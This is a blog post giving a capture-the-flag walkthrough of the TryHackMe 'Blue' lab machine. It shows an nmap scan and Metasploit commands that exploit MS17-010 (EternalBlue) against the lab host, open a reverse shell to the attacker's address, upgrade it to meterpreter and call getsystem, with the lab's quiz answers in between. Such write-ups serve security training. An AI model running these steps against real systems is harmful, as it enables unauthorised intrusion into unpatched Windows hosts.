<!DOCTYPE html>
<html lang=en><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title> Blue - .burso</title>
    <meta name="description" content="Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let&rsquo;s start with nmap scan.
$ nmap -sV -p0-1000 --script vuln 10.10.223.243 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 14:40 CET Nmap scan report for 10.10.223.243 Host is up (0.043s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC |_clamav-exec: ERROR: Script execution failed (use -d to debug) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn |_clamav-exec: ERROR: Script execution failed (use -d to debug) 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) |_clamav-exec: ERROR: Script execution failed (use -d to debug) Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010).">
    <link rel="canonical" href="/ctf/thm/blue/">
    <link rel="icon" href="/img/favicon.jpg" type="image/gif" sizes="16x16"> 
    <meta property="og:title" content="Blue">
    <meta property="og:type" content="article">
    <meta property="og:url" content="/ctf/thm/blue/">
    <meta property="og:description" content="Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let&rsquo;s start with nmap scan.
$ nmap -sV -p0-1000 --script vuln 10.10.223.243 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 14:40 CET Nmap scan report for 10.10.223.243 Host is up (0.043s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC |_clamav-exec: ERROR: Script execution failed (use -d to debug) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn |_clamav-exec: ERROR: Script execution failed (use -d to debug) 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) |_clamav-exec: ERROR: Script execution failed (use -d to debug) Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010).">
    <meta property="og:site_name" content=".burso">
    <link rel="stylesheet" href="/css/main.min.7fdf1d02dafd1a6eb5cfd0d707e17e33515b866f5d305a0ab01a4095577484fe.css" integrity="sha256-f98dAtr9Gm61z9DXB&#43;F&#43;M1Fbhm9dMFoKsBpAlVd0hP4=">
    <meta name="generator" content="Hugo 0.80.0" />
    <script type="module" src="https://unpkg.com/ionicons@5.1.2/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule="" src="https://unpkg.com/ionicons@5.1.2/dist/ionicons/ionicons.js"></script>
    
</head>
<body><header class="site-header">
    <nav class="site-nav" role="navigation" aria-label="breadcrumb">
    <ol itemscope itemtype="https://schema.org/BreadcrumbList" class="breadcrumb"><li class="breadcrumb-item  " 
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/">
    <span itemprop="name">.burso</span>
  </a>
  <meta itemprop="position" content="0" />
</li>/<li class="breadcrumb-item  " 
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/ctf/">
    <span itemprop="name">ctf</span>
  </a>
  <meta itemprop="position" content="0" />
</li>/<li class="breadcrumb-item  " 
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/ctf/thm/">
    <span itemprop="name">thm</span>
  </a>
  <meta itemprop="position" content="0" />
</li>/<li class="breadcrumb-item active hidden" aria-current="page"
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/ctf/thm/blue/">
    <span itemprop="name">blue</span>
  </a>
  <meta itemprop="position" content="1" />
</li></ol>
    </nav>
    <h1 class="site-title hidden">
		<a href="/">.burso</a>
    </h1>
</header>
<main id="content">
<article role="article" class="content post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
    <header class="post-header">        
        <h2 class="post-title" itemprop="name headline">Blue</h2>
        <span class="post-meta">
            <time class="date-published" datetime="2020-02-12T14:35:31&#43;07:00" itemprop="datePublished">
                Wed, 12 Feb 2020
            </time>
            
            <ul id="tags">
              
                <li> <a href="/tags/ctf">#CTF</a> </li>
              
                <li> <a href="/tags/eternalblue">#eternalblue</a> </li>
              
                <li> <a href="/tags/hashcat">#hashcat</a> </li>
              
                <li> <a href="/tags/metasploit">#metasploit</a> </li>
              
                <li> <a href="/tags/ms17-010">#MS17-010</a> </li>
              
                <li> <a href="/tags/tryhackme">#tryhackme</a> </li>
              
            </ul>
            
        </span>
    </header>
    <div class="post-content" itemprop="articleBody">
        <p>Hello everyone, today we look at the CTF with 
<a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="nofollow noreferrer noopener">MS17-010</a> vulnerability.
So let&rsquo;s start with nmap scan.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -p0-1000 --script vuln 10.10.223.243
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-02-12 14:40 CET
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.223.243
Host is up <span style="color:#f92672">(</span>0.043s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed ports
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
445/tcp open  microsoft-ds Microsoft Windows <span style="color:#ae81ff">7</span> - <span style="color:#ae81ff">10</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

 Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>.
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.73 seconds
</code></pre></div><p><strong>How many ports are open with a port number under 1000?:</strong></p>
<ul>
<li>3</li>
</ul>
<p><strong>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</strong></p>
<ul>
<li>ms17-010</li>
</ul>
<p>MS17-010 is very 
<a href="https://github.com/rapid7/metasploit-framework/issues/11964" target="_blank" rel="nofollow noreferrer noopener">unstable</a> exploit, it doesn&rsquo;t work in my linux or macos machine. But it works in my android with 
<a href="https://termux.com" target="_blank" rel="nofollow noreferrer noopener">termux</a> app. You can also buy PRO account and use their own kali machine.
So now I connect to my android phone and then we will continue to exploit server</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh 192.168.xx.yy -p8022 -lxxx_yyy
Welcome to Termux!

Wiki:            https://wiki.termux.com
Community forum: https://termux.com/community
Gitter chat:     https://gitter.im/termux/termux
IRC channel:     <span style="color:#75715e">#termux on freenode</span>

Working with packages:

 * Search packages:   pkg search &lt;query&gt;
 * Install a package: pkg install &lt;package&gt;
 * Upgrade packages:  pkg upgrade

Subscribing to additional repositories:

 * Root:     pkg install root-repo
 * Unstable: pkg install unstable-repo
 * X11:      pkg install x11-repo

Report issues at https://termux.com/issues

$
</code></pre></div><p>Now we can continue as on any other devices, so let&rsquo;s start <em>metasploit</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f                                                                         
EFLAGS: <span style="color:#ae81ff">00010046</span>                                                                                                                                              
eax: <span style="color:#ae81ff">00000001</span> ebx: f77c8c00 ecx: <span style="color:#ae81ff">00000000</span> edx: f77f0001                                                                                                       
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: <span style="color:#ae81ff">0018</span>   es: <span style="color:#ae81ff">0018</span>  ss: <span style="color:#ae81ff">0018</span>
Process Swapper <span style="color:#f92672">(</span>Pid: 0, process nr: 0, stackpage<span style="color:#f92672">=</span>80377000<span style="color:#f92672">)</span>


Stack: <span style="color:#ae81ff">90909090990909090990909090</span>
       <span style="color:#ae81ff">90909090990909090990909090</span>
       90909090.90909090.90909090
       90909090.90909090.90909090
       90909090.90909090.09090900
       90909090.90909090.09090900
       ..........................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ccccccccc.................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       .................ccccccccc
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ..........................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffff..................
       ffffffff..................


Code: <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing


       <span style="color:#f92672">=[</span> metasploit v5.0.79-dev                          <span style="color:#f92672">]</span>
+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">1979</span> exploits - <span style="color:#ae81ff">1087</span> auxiliary - <span style="color:#ae81ff">339</span> post       <span style="color:#f92672">]</span>
+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">559</span> payloads - <span style="color:#ae81ff">45</span> encoders - <span style="color:#ae81ff">10</span> nops            <span style="color:#f92672">]</span>
+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">7</span> evasion                                       <span style="color:#f92672">]</span>

msf5 &gt; search ms17-010

Matching Modules
<span style="color:#f92672">================</span>

   <span style="color:#75715e">#  Name                                           Disclosure Date  Rank     Check  Description</span>
   -  ----                                           ---------------  ----     -----  -----------
   <span style="color:#ae81ff">0</span>  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   <span style="color:#ae81ff">1</span>  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   <span style="color:#ae81ff">2</span>  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   <span style="color:#ae81ff">3</span>  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span style="color:#66d9ef">for</span> Win8+
   <span style="color:#ae81ff">4</span>  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   <span style="color:#ae81ff">5</span>  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
</code></pre></div><p><strong>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/&hellip;&hellip;..)</strong></p>
<ul>
<li>exploit/windows/smb/ms17_010_eternalblue</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; show options

Module options <span style="color:#f92672">(</span>exploit/windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span>:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
   RPORT          <span style="color:#ae81ff">445</span>              yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
   SMBDomain      .                no        <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span> The Windows domain to use <span style="color:#66d9ef">for</span> authentication
   SMBPass                         no        <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span> The password <span style="color:#66d9ef">for</span> the specified username
   SMBUser                         no        <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span> The username to authenticate as
   VERIFY_ARCH    true             yes       Check <span style="color:#66d9ef">if</span> remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check <span style="color:#66d9ef">if</span> remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   <span style="color:#ae81ff">0</span>   Windows <span style="color:#ae81ff">7</span> and Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>x64<span style="color:#f92672">)</span> All Service Packs


msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.223.243
</code></pre></div><p><strong>Show options and set the one required value. What is the name of this value? (All caps for submission)</strong></p>
<ul>
<li>RHOSTS</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; exploit
 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.8.11.158:4444 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445     - Host is likely VULNERABLE to MS17-010! - Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445     - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Connecting to target <span style="color:#66d9ef">for</span> exploitation.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - Connection established <span style="color:#66d9ef">for</span> exploitation.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - Target OS selected valid <span style="color:#66d9ef">for</span> OS indicated by SMB reply
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - CORE raw buffer dump <span style="color:#f92672">(</span><span style="color:#ae81ff">42</span> bytes<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - 0x00000000  <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">69</span> 6e <span style="color:#ae81ff">64</span> 6f <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">72</span> 6f <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">73</span>  Windows <span style="color:#ae81ff">7</span> Profes
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - 0x00000010  <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">69</span> 6f 6e <span style="color:#ae81ff">61</span> 6c <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">76</span>  sional <span style="color:#ae81ff">7601</span> Serv
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - 0x00000020  <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">63</span> 6b <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">31</span>                    ice Pack <span style="color:#ae81ff">1</span>      
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - Target arch selected valid <span style="color:#66d9ef">for</span> arch indicated by DCE/RPC reply
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Trying exploit with <span style="color:#ae81ff">12</span> Groom Allocations.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Sending all but last fragment of exploit packet
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Starting non-paged pool grooming
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - Sending SMBv2 buffers
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Sending final SMBv2 buffers.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Sending last fragment of exploit packet!
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Receiving response from exploit packet
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - ETERNALBLUE overwrite completed successfully <span style="color:#f92672">(</span>0xC000000D<span style="color:#f92672">)</span>!
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Sending egg to corrupted connection.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Triggering free of corrupted buffer.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.8.11.158:4444 -&gt; 10.10.223.243:49187<span style="color:#f92672">)</span> at 2020-03-20 11:49:18 +0100
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-WIN-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - <span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>-<span style="color:#f92672">=</span>




C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;
</code></pre></div><p>Okey, we&rsquo;re in, so let&rsquo;s background the process and migrate shell to meterpreter</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;^Z
Background session 1? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>  y
msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; use post/multi/manage/shell_to_meterpreter
</code></pre></div><p><strong>If you haven&rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</strong></p>
<ul>
<li>post/multi/manage/shell_to_meterpreter</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; show options

Module options <span style="color:#f92672">(</span>post/multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span>:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload <span style="color:#f92672">(</span>Will try to auto detect<span style="color:#f92672">)</span>.
   LPORT    <span style="color:#ae81ff">4433</span>             yes       Port <span style="color:#66d9ef">for</span> payload to connect to.
   SESSION                   yes       The session to run this module on.
</code></pre></div><p><strong>Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)</strong></p>
<ul>
<li>SESSION</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; show sessions 

Active sessions
<span style="color:#f92672">===============</span>

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  <span style="color:#ae81ff">1</span>         shell x64/windows  Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span> Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation...  10.8.11.158:4444 -&gt; 10.10.223.243:49187 <span style="color:#f92672">(</span>10.10.223.243<span style="color:#f92672">)</span>
msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; set SESSION <span style="color:#ae81ff">1</span> 
SESSION <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; run

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Upgrading session ID: <span style="color:#ae81ff">1</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting exploit/multi/handler
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.8.11.158:4433 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Post module execution completed
msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">180291</span> bytes<span style="color:#f92672">)</span> to 10.10.223.243
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>10.8.11.158:4433 -&gt; 10.10.223.243:49197<span style="color:#f92672">)</span> at 2020-03-20 11:57:43 +0100
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Stopping exploit/multi/handler
msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; show sessions

Active sessions
<span style="color:#f92672">===============</span>

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  <span style="color:#ae81ff">1</span>         shell x64/windows        Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span> Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation...  10.8.11.158:4444 -&gt; 10.10.223.243:49187 <span style="color:#f92672">(</span>10.10.223.243<span style="color:#f92672">)</span>
  <span style="color:#ae81ff">2</span>         meterpreter x86/windows  NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM @ JON-PC                                                      10.8.11.158:4433 -&gt; 10.10.223.243:49197 <span style="color:#f92672">(</span>10.10.223.243<span style="color:#f92672">)</span>
</code></pre></div><p>Migrating shell to meterpreter was successful, so we have 2 sessions now. Let&rsquo;s run the second one, the meterpreter session
and migrate process to another process id.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; sessions <span style="color:#ae81ff">2</span>                                                                                                     
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 2...                                                                                                                            
                                                                                                                                                              
meterpreter &gt; getsystem                                                                                                                                       
